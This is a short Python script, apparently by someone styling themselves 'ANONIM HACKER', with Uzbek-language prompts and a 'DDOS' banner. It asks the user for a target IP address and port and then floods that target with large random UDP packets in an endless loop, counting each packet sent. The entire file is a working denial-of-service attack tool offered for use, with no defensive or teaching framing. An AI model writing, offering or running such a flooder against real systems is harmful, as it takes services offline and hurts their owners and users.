import os,time,socket,random
from art import tprint as t
y = '\033[92m' 
s = '\033[93m' 
q = '\033[91m' 
t("DDOS ")
print(q," [#] Salom ushbu script ANONIM HACKER tomonidan tuzildi ")
host = input("  [#]  Nishon ip manzilini kirgazing > ")
port = int(input("  [#] Nishon portini kirgazing > "))
internet = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
packet = random._urandom(24057)
sent = 0
print(y," [#] Hujum boshlanmoqda ! ")
print(s,"telegram > ANONIM HACKER ")
time.sleep(2)
while True :
    internet.sendto(packet,(host,port))
    sent += 1
    print(s,f"{host} nishoniga {port} porti orqali hujum bolmoqda yuborildi {sent} !")